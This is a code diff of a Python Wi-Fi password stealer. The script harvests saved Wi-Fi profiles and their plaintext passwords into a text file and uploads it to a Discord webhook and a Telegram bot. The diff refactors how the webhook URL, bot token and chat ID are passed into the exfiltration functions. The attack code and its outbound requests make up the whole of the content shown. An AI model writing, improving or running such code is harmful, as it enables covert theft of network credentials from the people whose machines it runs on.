@@ -4,12 +4,7 @@ import requests
 from dotenv import load_dotenv
 from pathlib import Path
 
-# Load environment variables
-dotenv_path = Path('env/.env')
-load_dotenv(dotenv_path=dotenv_path)
-DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
-TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
+
 
 # File path to save Wi-Fi passwords
 wifi_passwords_file = "wifi_passwords.txt"
@@ -33,10 +28,11 @@ def wifi_profiles_and_passwords():
                     file.write(f"Profile: {profile}\nPassword: ENCODING ERROR\n")
                     file.write("-" * 50 + "\n")
         print(f"Wi-Fi profiles and passwords saved to {wifi_passwords_file}")
+        return wifi_passwords_file
     except Exception as e:
         print(f"Error: {e}")
 
-def send_wifi_file_to_discord(wifi_passwords_file, file_description):
+def send_wifi_file_to_discord(wifi_passwords_file, DISCORD_WEBHOOK_URL, file_description):
     try:
         with open(wifi_passwords_file, 'rb') as file:
             files = {
@@ -54,7 +50,7 @@ def send_wifi_file_to_discord(wifi_passwords_file, file_description):
     except Exception as e:
         print(f"Error sending file to Discord: {e}")
 
-def send_wifi_file_to_telegram(wifi_passwords_file, file_description):
+def send_wifi_file_to_telegram(wifi_passwords_file, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, file_description):
     try:
         with open(wifi_passwords_file, 'rb') as file:
             response = requests.post(
